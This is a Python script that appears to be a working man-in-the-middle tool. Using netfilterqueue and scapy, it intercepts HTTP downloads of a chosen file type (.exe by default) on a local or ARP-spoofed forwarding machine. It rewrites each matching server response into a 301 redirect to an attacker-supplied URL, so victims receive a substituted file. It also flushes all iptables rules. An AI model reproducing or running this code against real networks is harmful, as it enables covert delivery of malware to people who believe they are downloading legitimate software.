import netfilterqueue
from scapy.layers.l2 import Raw
from scapy.layers.inet import IP, TCP
from scapy.arch import get_if_addr
from scapy.config import conf
import argparse
import os

MY_IP = get_if_addr(conf.iface) #IP of DEFAULT INTERFACE
TARGET = '.exe' #DEFAULT TARGET
ack_list = []
URL = 'https://www.google.com'

#Process each packet
def process_packet(packet):
    global ack_list
    IP_pkt = IP(packet.get_payload())
    
    if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
        if IP_pkt[TCP].dport == 80:
            print('HTTP request')
            
            #Request of download a program
            if TARGET in str(IP_pkt[Raw].load):
                print(f'{TARGET} file detected')
                ack_list.append(IP_pkt[TCP].ack)

        elif IP_pkt[TCP].sport == 80:
            print('HTTP response')

            #Is it response seq in ack list
            if IP_pkt[TCP].seq in ack_list:
                #Remove corresponding ACK in the list
                ack_list.remove(IP_pkt[TCP].seq)
                IP_pkt[Raw].load = f'HTTP/1.1 301 Moved Permanently\r\nLocation: {URL}\r\n\r\n'

                #Scapy recomputes them
                del IP_pkt[IP].len
                del IP_pkt[IP].chksum
                del IP_pkt[TCP].len
                del IP_pkt[TCP].chksum

                packet.set_payload(IP_pkt)

    packet.accept()


#Parser of command line argument
def args_parser():
    global MY_IP, TARGET, URL
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
    parser.add_argument("-interface", "-i", dest="interface", help="Name of the network interface of your machine")
    parser.add_argument("-target", "-t", dest="target", help="Target extension of files")
    parser.add_argument("-url", dest="url", help="URL of files you want to use to replace response")

    #Parse command line arguments
    args = parser.parse_args()

    #Check if the name of the network interface and the target domain have been specified
    if args.interface:
        MY_IP = get_if_addr(args.interface)

    if args.target:
        TARGET = args.target

    if not args.url:
       exit(1)

    URL=args.url

    return args.local


def main():
    local = args_parser()

    #Packets are blocked and not forwarded
    if local:
        os.system('iptables -F')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
    else:
        os.system('iptables -F')
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')


    #O = queue num
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        queue.run()
    except KeyboardInterrupt:
        queue.unbind()
        print('Flushing ip table.', end='\n\n')
        os.system('iptables -F')

if __name__=='__main__':
	main()
